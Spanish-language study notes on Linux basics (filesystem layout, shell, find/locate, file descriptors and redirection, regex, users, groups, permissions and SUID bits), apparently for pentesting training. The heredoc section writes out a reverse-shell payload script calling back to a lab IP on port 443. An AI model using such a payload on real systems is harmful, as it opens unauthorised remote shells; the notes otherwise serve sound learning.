
# Introduction
- Todos los recursos del sistema son un archivo
- La configuración de los datos se guarda en Archivos de Texto
- Programas pequeños y encadenables


## Componentes del sistema de Linux:
![[componentes_linux.drawio.png]]

## Sistema de Archivos Jerárquico

| Ruta     | Contenido                                                        |
|----------|------------------------------------------------------------------|
| `/`      | Raíz del sistema. Todo lo demás se monta debajo                  |
| `/bin`   | Binarios esenciales (comandos básicos)                           |
| `/boot`  | Bootloader, kernel y archivos de arranque                        |
| `/dev`   | Archivos de dispositivo (acceso al hardware)                     |
| `/etc`   | Archivos de configuración del sistema y apps                     |
| `/home`  | Directorios personales de cada usuario                           |
| `/lib`   | Librerías compartidas necesarias para el arranque                |
| `/media` | Punto de montaje de medios extraíbles (USB, etc.)                |
| `/mnt`   | Punto de montaje temporal para filesystems                       |
| `/opt`   | Software opcional / herramientas de terceros                     |
| `/root`  | Home del usuario root                                            |
| `/sbin`  | Binarios de administración del sistema                           |
| `/tmp`   | Archivos temporales, se borran al reiniciar                      |
| `/usr`   | Binarios, librerías y manuales de programas de usuario           |
| `/var`   | Datos variables: logs, correo, archivos web, cron                |

# The Shell
## Diferencias entre SHELL y TERMINAL

La terminal es el programa que permite emular el SHELL. Es el monitor attached a la Shell
La Shell es el programa que procesa, entiende y ejecuta los comandos.

![[termbash|800]]



## Prompt Description:
```
<username>@<hostname><current working directory>$
```

Se puede editar qué aparece en el Prompt por medio de la variable de sistema **PS1** y se puede editar en .bashrc
Para ver la variable se hace con:
``
```bash
echo $PS1
```
Para generar un prompt bien chévere, se puede usar: https://bash-prompt-generator.org/
## Grabar sesiones de comandos en pentesting
- usar `script <file>` para guardar todos los comandos que se usarán de aquí en adelante el file. Se sale con `exit` y para ver la sesión, con `cat <file>`
- `script` graba TODO EL STDOUT en un archivo. Por lo que será una replica de texto en la terminal.


## Ayudas en comandos
- usar MAN, -h, --help

```bash
apropos <tool>
```
### **apropos** 
- Nos da información muy breve de que hace una herramienta o comando. Como ejemplo:

```zsh
┌──(kali㉿kali)-[~]
└─$ apropos sudo
cvtsudoers (1)       - convert between sudoers file formats
sudo (8)             - execute a command as another user
sudo.conf (5)        - configuration for sudo front-end
sudo_logsrv.proto (5) - Sudo log server protocol
sudo_logsrvd (8)     - sudo event and I/O log server
sudo_logsrvd.conf (5) - configuration for sudo_logsrvd
sudo_plugin (5)      - Sudo Plugin API
sudo_sendlog (8)     - send sudo I/O log to log server
sudoedit (8)         - execute a command as another user
sudoers (5)          - default sudo security policy plugin
sudoers_timestamp (5) - Sudoers Time Stamp Format
sudoreplay (8)       - replay sudo session logs
visudo (8)           - edit the sudoers file
               
```

O usar https://explainshell.com/ para ver la explicación a fondo de comandos

## Grupos
Los grupos a los que pertenece un usuario se pueden ver con `id` y estos tienen permisos en ciertos recursos del sistema.

## INodos
Un inodo es la estructura de datos con la que Linux representa un archivo. Contiene:
- Número de inodo
- Tipo (file, directory, symlink, device...)
- Permisos rwx
- Dueño y grupo (UID, GID)
- Tamaño en bytes
- Contador de hardlinks (enlaces que apuntan directamente al nodo)
- timestamps
- punteros a bloques de datos en el disco fisico

## Devolverse al directorio anterior en historial
`cd -`
```bash
┌──(kali㉿kali)-[/var/mail]
└─$ cd /home/kali/Downloads   
                                                                                  
┌──(kali㉿kali)-[~/Downloads]
└─$ cd -                   
/var/mail
                                                                                  
┌──(kali㉿kali)-[/var/mail]
└─$ 




```

# Workflow
## Comandos de busqueda
find:
```bash
find <location> <options>
```

las options son filtros. Pueden haber muchos.
Flag interesante:
- -exec command
- Ej: `find / -type f -name *.ovpn -exec ls -la {} \; `. Lo que hace es que por ejemplo, desde la raiz busca todos los archivos con extension .ovpn y a cada uno le ejecuta el comando ls -la. {} es un place holder y \; le dice al shell dónde termina el comando de ejecución.

locate:
```bash
sudo updatedb
locate *.ovpn
```

Locate funciona con una base de datos local del sistema. Para actualizarla se hace con `sudo updatedb` y `locate` busca archivos mucho mas rapido que `find`.


## Redireccionadores y File Descriptors

Un file descriptor es un número que el kernel asigna a un recurso del sistema como un archivo, socket o recursos con operaciones de Input/Output.
Los FD asignados por default en el sistema son:
- FD 0: stdin
- FD 1: stdout
- FD 2: stderr

Realmente los FD apuntan a un recurso del sistema.

```
Proceso (tabla de fds)        Kernel
┌────┬──────────────┐
│ 0  │ ─────────────┼──► /dev/pts/0 (teclado)
│ 1  │ ─────────────┼──► /dev/pts/0 (pantalla)
│ 2  │ ─────────────┼──► /dev/pts/0 (pantalla)
│ 3  │ ─────────────┼──► archivo abierto ──► inodo 52341
└────┴──────────────┘
```
 Todo proceso en linux tiene sus propios FD. Pero todo proceso nace con los 3 primeros abiertos.

### Direccionadores
- >: `comando > archivo` redirecciona la salida del comando (o sea el FD=1) al archivo
- <: `comando < archivo` toma el contenido del archivo y lo coge como input para el comando. Toca saber usarlo. Ej: `bash < pueba.txt` donde prueba contiene `ls`
- >>: lo mismo para > pero en lugar de sobreescribir todo el contenido, hace append
- `<<`:

Construye un stdin multilínea en el momento, hasta un marcador (`EOF`, convención; puede ser cualquier palabra). Funciona con cualquier comando que lea de stdin.

**Crear archivo sin editor** (útil en shells limitadas):
```bash
cat << EOF > payload.sh
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.5/443 0>&1
EOF
```

**Automatizar comando interactivo (mysql):**
```bash
mysql -u root -p << EOF
USE webapp;
SELECT * FROM users;
EOF
```

**Automatizar sesión (ftp):**
```bash
ftp -n servidor << EOF
user anonymous pass
get archivo.txt
bye
EOF
```

> Primos: `<` lee un archivo existente · `<<<` manda una sola cadena (`cat <<< "texto"`)


## Estructura de una línea de `/etc/passwd`

En /etc/passwd se ven todos los usuarios del sistema. Algunos son personas (los logueables) y otros son servicios (no logueables)
```
kali : x : 1000 : 1000 :  : /home/kali : /usr/bin/zsh
 │     │   │      │     │       │            │
 │     │   │      │     │       │            └── shell de login
 │     │   │      │     │       └── home
 │     │   │      │     └── GECOS (nombre/descripción, aquí vacío)
 │     │   │      └── GID (grupo primario)
 │     │   └── UID
 │     └── x = la contraseña está en /etc/shadow, no aquí
 └── nombre de usuario
```

UID >= 1000 son usuarios personas, junto 0 que es root


## Filtradores de contenido

#### More y less
`more` y `less` son comandos que permiten abrir una salida en un paginador (se ve con su propio contexto). Usar `less` siempre, `more` es la versión vieja incomoda.

otros interesantes son:
- grep: filtra por patrones
- cut: recorta delimitadores
- tr: sustituye delimitadores
- awk: manipula archivos basados en columnas

Un ejemplo poderoso de filtering:
- Hallar la cantidad de todos los directorios únicos en el codigo fuente de ### https://www.inlanefreight.com
- Respuesta: 
  `curl -s https://www.inlanefreight.com | tr " " "\n" | grep https://www.inlanefreight.com | cut -d "'" -f2 | cut -d "\"" -f2 | sort -u | wc -l`


## Operadores regex

| Op    | Nombre        | Qué hace                                                           | Ejemplo                                            |
| ----- | ------------- | ------------------------------------------------------------------ | -------------------------------------------------- |
| `( )` | Grupo         | Junta varios caracteres como una unidad                            | `(ab)+` → ab, abab...                              |
| `[ ]` | Clase         | UN carácter de un conjunto                                         | `[abc]`, `[a-z]`, `[a-zA-Z0-9]`, `[^0-9]` (negado) |
| `{ }` | Cuantificador | Cuántas veces se repite lo anterior                                | `a{3}`, `a{2,5}`, `a{2,}`                          |
| `\|`  | OR            | Una de dos expresiones                                             | `cat\|bat`                                         |
| `.*`  | Comodín       | Cualquier cosa en el medio (NO es un AND real) pero sirve como uno | `foo.*bar`                                         |

**Clases comunes:**
- `[abc]` → una a, b o c
- `[a-z]` → una minúscula
- `[a-zA-Z0-9]` → letra o número
- `[^0-9]` → cualquiera que NO sea dígito

**Atajos de `{ }`:**
- `*` = `{0,}` (cero o más)
- `+` = `{1,}` (uno o más)
- `?` = `{0,1}` (cero o uno)

**OR vs Clase:** `cat|bat` compara palabras completas; `[cb]at` compara un carácter del conjunto + "at".

**Ejemplo combinado (IP):**
```bash
([0-9]{1,3}\.){3}[0-9]{1,3}
```



## Grupos y Usuarios

#### Usuarios
Para crear un usuario en el sistema, se usa el siguiente comando:
```bash
sudo useradd -m -s /bin/bash <nombre_de_usuario>
sudo passwd <nombre_de_usuario>
```
donde: 
- -m: es montar el /home del usuario
- -s es darle una shell como programa principal que se lanza al loguearse en él

#### Grupos
Un grupo en Linux es simplemente una colección de usuarios y nada más.
- Un usuario puede estar en varios grupos a la vez
- Al crear un usuario, se crea un grupo con su mismo nombre donde él mismo pertenece

![[grupos.excalidraw|800]]
A un grupo no se le asigna una serie de permisos como un GPO de AD. Solo sirve para coleccionar usuarios.
Donde se hace la distinción es al configurar permisos **RWX** en un archivo/directorio, que tiene 3 niveles de permisos:

1. **USER**: Estos permisos se crean cuando el usuario crea el archivo y solo el usuario creador/dueño tiene esos permisos sobre el archivo
   
2. **GROUP** : Por default, al crearse un archivo se le pone el mismo grupo primario del usuario dueño. Se le puede cambiar el grupo al archivo, y ahí mismo se le configuran los permisos. Por lo tanto, solo los usuarios que pertenezcan a ese grupo tendrán este nivel de permisos
   
3. **OTHERS**: Si el usuario no es dueño del archivo ni pertenece al grupo asignado en el mismo, se le asignan los permisos del nivel OTHERS
```bash
morrocoy2013@htb[/htb]$ ls -l /etc/passwd

- rwx rw- r--   1 root root 1641 May  4 23:42 /etc/passwd
- --- --- ---   |  |    |    |   |__________|
|  |   |   |    |  |    |    |        |_ Date
|  |   |   |    |  |    |    |__________ File Size
|  |   |   |    |  |    |_______________ Group
|  |   |   |    |  |____________________ User
|  |   |   |    |_______________________ Number of hard links
|  |   |   |_ Permission of others (read)
|  |   |_____ Permissions of the group (read, write)
|  |_________ Permissions of the owner (read, write, execute)
|____________ File type (- = File, d = Directory, l = Link, ... )
```


Para cambiar permisos del archivo:
- ``chmod 777 <nombre de archivo>``
- `chmod 600 <nombre de archivo>`
- y en general, expresado en regex pa practicar: `chmod [(0-7){3}] <nombre de archivo>`

O simbolicamente sin octal: 
`chmod <nivel de permiso> +- <modo de permiso> <archivo>` donde:
- Nivel de permiso: u = owner, g = group, o = others, a = all
- Modo de permiso: r,w,x

Para cambiar propietario y/o grupo del archivo:
- ``chwon <user>:<group> <file/directory>``

NOTA: "rwx" en directorios significa algo distinto que en archivos

| Permiso | En archivo     | En directorio                 |
| ------- | -------------- | ----------------------------- |
| `r`     | leer contenido | listar (`ls`)                 |
| `w`     | modificar      | crear/borrar/renombrar dentro |
| `x`     | ejecutar       | entrar (`cd`)                 |

#### SUID, SGID y STICKY

Bits de permisos especiales (4º dígito octal):

* **SUID** (4): el proceso SIEMPRE corre con la identidad del DUEÑO del archivo (no de quien lo lanza). Requiere que el usuario ya tenga permiso de ejecución (x); si no, ni se aplica. Ej: passwd. Se ve como `s` en el trío del user.
* **SGID** (2): el proceso corre con la identidad del GRUPO dueño del archivo. En DIRECTORIOS, además hace que los archivos creados dentro hereden el grupo del directorio. Se ve como `s` en el trío del group.
* **Sticky** (1): en DIRECTORIOS compartidos (ej. /tmp), solo el dueño de cada archivo (o del dir, o root) puede borrarlo/renombrarlo, aunque todos tengan `w` sobre el dir. No protege el contenido del archivo, solo borrado/renombrado. Se ve como `t` en el trío de others.

ESPECIALES   USER     GROUP    OTHERS
 SUID SGID st  r w x   r w x    r w x
   4       2     1   4 2 1  4 2 1    4 2 1
   
Requisito SUID/SGID: primero el sistema mira si puedes EJECUTAR (x); solo entonces aplica el cambio de identidad. Binario SUID que no puedes ejecutar = inútil.

Mayúscula (S/T) = bit especial puesto pero falta la x debajo = mal configurado.



# User Management

## Gestores de paquetes
Ayudan a instalar, actualizar o borrar programas sin tenerlo que hacer a mano, evitando buscarlos, instalar sus dependencias, compilarlos, etc. 
Existen varios tales como: apt, pacman, yum, gem, pip, git, dpkg, etc.

- Comando para ver programas instalados en debian: `dpkg -l`

